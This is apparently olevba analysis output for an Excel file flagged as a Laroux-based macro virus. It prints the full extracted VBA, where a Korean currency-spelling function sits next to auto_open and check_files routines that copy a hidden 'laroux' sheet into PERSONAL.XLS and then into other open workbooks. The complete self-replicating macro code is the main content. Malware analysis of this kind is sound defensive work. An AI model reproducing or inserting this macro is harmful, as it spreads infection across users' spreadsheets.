olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-cdb36ca5232304aec272b1f6f81013dbc981a810
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-cdb36ca5232304aec272b1f6f81013dbc981a810 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' 매크로1 Macro
' 이명근이(가) 97-04-20에 기록한 매크로
'
'
Function han_code(a As String) As String
    mylen = Len(a)
    
    
    For i = 1 To mylen
        ch = Mid(a, i, 1)
        Select Case ch
            Case "0"
                ch = "영"
            Case "1"
                ch = "일"
            Case "2"
                ch = "이"
            Case "3"
                ch = "삼"
            Case "4"
                ch = "사"
            Case "5"
                ch = "오"
            Case "6"
                ch = "육"
            Case "7"
                ch = "칠"
            Case "8"
                ch = "팔"
            Case "9"
                ch = "구"
        End Select
        My_string = My_string & ch
    Next i
        
    For i = mylen To 1 Step -1
        Select Case i
            Case 1
                ch = ""
            Case 2
                ch = "십"
            Case 3
                ch = "백"
            Case 4
                ch = "천"
            Case 5
                ch = "만"
            Case 6
                ch = "십"
            Case 7
                ch = "백"
            Case 8
                ch = "천"
            Case 9
                ch = "억"
            Case 10
                ch = "십"
            Case 11
                ch = "백"
            Case 12
                ch = "천"
        End Select
        My_string2 = My_string2 & ch
    Next i
    
    mycount2 = mylen + 1
    For j = 1 To mylen
        mycount = mylen - j
        Select Case mycount2 - j
            Case 12
                dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
            Case 11
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 10
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 9
                If Mid(My_string, j, 1) = "영" Then
                    dh = "억"
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 8
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 7
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 6
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 5
                If Mid(My_string, j, 1) = "영" Then
                    If Mid(My_string, mycount + 1, 1) = "영" Then
                        If Mid(My_string, mycoynt + 2, 1) = "영" Then
                            If Mid(My_string, mycount + 3, 1) = "영" Then
                                If Mid(My_string, mycount + 4, 1) = "영" Then
                                    If Mid(My_string, mycount + 5, 1) = "영" Then
                                        dh = ""
                                    Else
                                        dh = "만"
                                    End If
                                Else
                                    dh = "만"
                                End If
                            Else
                                dh = "만"
                            End If
                        Else
                            dh = "만"
                        End If
                    Else
                        dh = "만"
                    End If
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 4
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 3
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 2
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
            Case 1
                If Mid(My_string, j, 1) = "영" Then
                    dh = ""
                Else
                    dh = Mid(My_string, j, 1) & Mid(My_string2, j, 1)
                End If
        End Select
    han_code2 = han_code2 & dh
    Next j
    han_code = "일금" & han_code2 & "원정"
End Function

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  larou
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

